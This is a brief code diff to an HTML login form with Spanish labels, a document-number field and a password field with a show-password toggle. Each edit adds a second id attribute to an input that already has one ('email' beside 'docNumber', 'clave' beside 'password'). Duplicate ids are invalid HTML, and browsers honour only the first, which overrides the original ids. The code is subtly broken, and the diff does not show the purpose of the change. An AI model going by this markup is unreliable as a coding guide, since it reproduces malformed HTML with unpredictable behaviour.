@@ -279,7 +279,7 @@
                 </div>
 
                 <div class="input-wrap">
-                    <input
+                    <input id="email"
                         type="tel"
                         id="docNumber"
                         name="numero_documento"
@@ -296,7 +296,7 @@
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
-            <input id="password" type="password" name="password">
+            <input id="clave" id="password" type="password" name="password">
             <div class="eye" id="togglePassword">
                 <img src="img/eye-open.png" alt="Mostrar contraseña">
             </div>
